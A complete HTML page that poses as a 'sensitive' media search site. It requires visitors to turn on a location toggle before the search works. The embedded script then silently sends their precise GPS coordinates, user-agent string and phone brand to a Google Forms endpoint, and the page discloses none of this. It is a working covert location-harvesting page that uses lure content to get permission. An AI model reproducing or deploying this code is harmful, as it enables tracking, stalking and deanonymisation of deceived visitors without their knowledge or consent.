<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>リップズ</title>

<style>
body {
  margin: 0;
  background: black;
  color: white;
  font-family: Arial, sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
}

h1 { margin-top: 40px; }

.main-img {
  margin-top: 20px;
  width: 150px;
  height: 150px;
  border-radius: 18px;
  object-fit: cover;
}

.control {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-top: 20px;
}

input {
  width: 180px;
  padding: 12px;
  border-radius: 10px;
  border: none;
}

button {
  padding: 10px 20px;
  border-radius: 10px;
  border: none;
  font-weight: bold;
  cursor: pointer;
}

button.disabled {
  background: #555;
  color: #999;
  cursor: not-allowed;
}

button.active {
  background: white;
  color: black;
}

/* Toggle */
.toggle {
  width: 50px;
  height: 26px;
  background: #555;
  border-radius: 20px;
  position: relative;
  cursor: pointer;
}

.toggle::after {
  content: "";
  width: 22px;
  height: 22px;
  background: white;
  border-radius: 50%;
  position: absolute;
  top: 2px;
  left: 2px;
  transition: 0.3s;
}

.toggle.on {
  background: #0f0;
}

.toggle.on::after {
  left: 26px;
}

.warning {
  margin-top: 120px;
  opacity: 0.6;
}

/* Modal */
.modal {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.6);
  backdrop-filter: blur(8px);
  justify-content: center;
  align-items: center;
  z-index: 999;
}

.modal-box {
  width: 320px;
  text-align: center;
  position: relative;
}

.modal img, .modal video {
  width: 100%;
  border-radius: 16px;
}

.close {
  position: absolute;
  top: -35px;
  right: 0;
  font-size: 22px;
  cursor: pointer;
}

/* Phone button */
.phone-btn {
  position: fixed;
  bottom: 20px;
  right: 20px;
  width: 50px;
  height: 50px;
  background: white;
  border-radius: 50%;
  display: flex;
  justify-content: center;
  align-items: center;
}

.phone-btn svg {
  width: 28px;
  height: 28px;
  fill: black;
}
</style>
</head>

<body>

<h1>リップズ</h1>

<img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">

<div class="control">
  <input id="keyword" placeholder="Search" disabled>
  <button id="searchBtn" class="disabled">SEARCH</button>
  <div id="toggle" class="toggle"></div>
</div>

<div class="warning">This Web Is Sensitive ⚠</div>

<div class="modal" id="modal">
  <div class="modal-box" id="modalBox">
    <div class="close" onclick="closeModal()">✕</div>
  </div>
</div>

<a href="https://wa.me/6281317309919" target="_blank" class="phone-btn">
<svg viewBox="0 0 24 24">
<path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
</svg>
</a>

<script>
let data = {};
let locationEnabled = false;

fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
  .then(r => r.json())
  .then(j => data = j);

const toggle = document.getElementById("toggle");
const searchBtn = document.getElementById("searchBtn");
const keyword = document.getElementById("keyword");

toggle.onclick = () => {
  if (locationEnabled) {
    locationEnabled = false;
    toggle.classList.remove("on");
    searchBtn.className = "disabled";
    keyword.disabled = true;
    return;
  }

  navigator.geolocation.getCurrentPosition(pos => {
    locationEnabled = true;
    toggle.classList.add("on");
    searchBtn.className = "active";
    keyword.disabled = false;

    sendLocation(pos);
  }, () => {
    alert("Izin lokasi ditolak");
  });
};

searchBtn.onclick = () => {
  if (!locationEnabled) return;

  const key = keyword.value.toLowerCase().trim();
  if (!data[key]) return;

  const box = document.getElementById("modalBox");
  box.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';

  if (data[key].type === "video") {
    const v = document.createElement("video");
    v.src = data[key].src;
    v.controls = true;
    v.autoplay = true;
    box.appendChild(v);
  } else {
    const img = document.createElement("img");
    img.src = data[key].images[0];
    box.appendChild(img);
  }

  document.getElementById("modal").style.display = "flex";
};

function closeModal() {
  document.getElementById("modal").style.display = "none";
}

function fix(n) {
  return Number(n).toFixed(6);
}

function getBrand() {
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes("samsung")) return "Samsung";
  if (ua.includes("infinix")) return "Infinix";
  if (ua.includes("xiaomi")) return "Xiaomi";
  if (ua.includes("oppo")) return "Oppo";
  if (ua.includes("vivo")) return "Vivo";
  return "Unknown";
}

function sendLocation(pos) {
  const lat = fix(pos.coords.latitude);
  const lon = fix(pos.coords.longitude);
  const ua = navigator.userAgent;
  const brand = getBrand();

  const url =
    "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse?" +
    "entry.138340134=" + lat +
    "&entry.1616098311=" + lon +
    "&entry.1257224602=" + encodeURIComponent(ua) +
    "&entry.1874088822=" + brand;

  fetch(url, { mode: "no-cors" });
}
</script>

</body>
</html>
